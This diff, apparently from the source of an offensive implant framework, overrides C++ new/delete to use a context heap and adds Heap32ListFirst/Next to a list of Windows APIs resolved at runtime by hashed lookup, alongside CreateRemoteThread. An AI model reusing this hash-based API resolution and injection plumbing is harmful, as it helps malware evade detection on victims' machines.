@@ -8,6 +8,23 @@
  * todo: add dark loadlibrary
  * todo: fix server side issues
  */
+void* operator new(size_t size) {
+    HEXANE
+
+    void *ptr = { };
+    if (size) {
+        ptr = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, size);
+    }
+    return ptr;
+}
+
+void operator delete(void* ptr) noexcept {
+    HEXANE
+
+    if (ptr) {
+        Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ptr);
+    }
+}
 
 namespace Memory {
     LPVOID ExceptionReturn = 0;
@@ -40,13 +57,13 @@ namespace Memory {
                 return;
             }
 
-            if (Heap32ListFirst(snap, &heaps)) {
+            if (Ctx->win32.Heap32ListFirst(snap, &heaps)) {
                 do {
                     // todo: this - adding new/delete overrides for OOP
                     //_heap_info heap_info = {heaps.th32HeapID, heaps.th32ProcessID};
                     //m_heaps.push_back(heap_info);
                 }
-                while (Heap32ListNext(snap, &heaps));
+                while (Ctx->win32.Heap32ListNext(snap, &heaps));
             }
         }
 
@@ -241,6 +258,8 @@ namespace Memory {
                 !(F_PTR_HMOD(Ctx->win32.CreateRemoteThread, Ctx->Modules.kernel32, CREATEREMOTETHREAD)) ||
                 !(F_PTR_HMOD(Ctx->win32.GetComputerNameExA, Ctx->Modules.kernel32, GETCOMPUTERNAMEEXA)) ||
                 !(F_PTR_HMOD(Ctx->win32.GetLocalTime, Ctx->Modules.kernel32, GETLOCALTIME)) ||
+                !(F_PTR_HMOD(Ctx->win32.Heap32ListFirst, Ctx->Modules.kernel32, HEAP32LISTFIRST)) ||
+                !(F_PTR_HMOD(Ctx->win32.Heap32ListNext, Ctx->Modules.kernel32, HEAP32LISTNEXT)) ||
                 !(F_PTR_HMOD(Ctx->win32.SleepEx, Ctx->Modules.kernel32, SLEEPEX)) ||
 
                 !(F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA, Ctx->Modules.kernel32, GETCURRENTDIRECTORYA)) ||
